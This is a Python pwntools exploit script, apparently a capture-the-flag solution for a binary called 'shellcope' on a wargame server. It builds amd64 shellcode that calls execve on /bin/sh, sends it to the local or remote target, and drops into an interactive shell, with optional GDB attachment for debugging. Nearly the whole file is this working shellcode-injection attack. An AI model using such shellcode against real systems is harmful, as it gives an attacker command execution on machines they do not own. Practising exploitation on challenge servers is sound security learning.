#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('./shellcope')
context.arch = 'amd64'

host = args.HOST or 'pwnable.co.il'
port = int(args.PORT or 9001)

gdbscript = '''
set disassembly-flavor intel
# Set a breakpoint at a known location, e.g., at main or the function that reads input
b main
'''

def start_local():
    return process(exe.path)

def start_remote():
    return remote(host, port)

def start():
    if args.LOCAL:
        return start_local()
    else:
        return start_remote()

io = start()

# Attach GDB before sending the shellcode
if args.GDB:
    gdb.attach(io, gdbscript=gdbscript)
    pause()  # Wait until you set your breakpoints and are ready

# Construct your shellcode
shellcode = asm('''
    lea rbx, [rip + binsh]
    mov rdi, rbx
    xor rsi, rsi
    xor rdx, rdx
    mov al, 59
    syscall

    binsh:
    .ascii "/bin/sh\\x00"                     
''')

with open('shellcode.bin', 'wb') as f:
    f.write(shellcode)

io.sendline(shellcode)
io.interactive()
